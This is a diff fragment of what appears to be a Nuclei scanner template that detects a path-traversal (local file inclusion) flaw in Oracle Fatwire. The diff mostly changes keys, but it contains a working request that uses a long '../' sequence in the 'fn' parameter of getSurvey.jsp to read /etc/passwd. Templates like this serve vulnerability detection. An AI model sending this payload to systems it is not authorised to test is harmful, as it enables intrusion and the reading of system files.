@@ -13,10 +13,8 @@ info:
     cvss-score: 8.6
     cwe-id: CWE-22
   tags: lfi,oracle,fatwire,edb
-  metadata:
-    max-request: 1
 
-http:
+requests:
   - method: GET
     path:
       - "{{BaseURL}}/cs/career/getSurvey.jsp?fn=../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd"
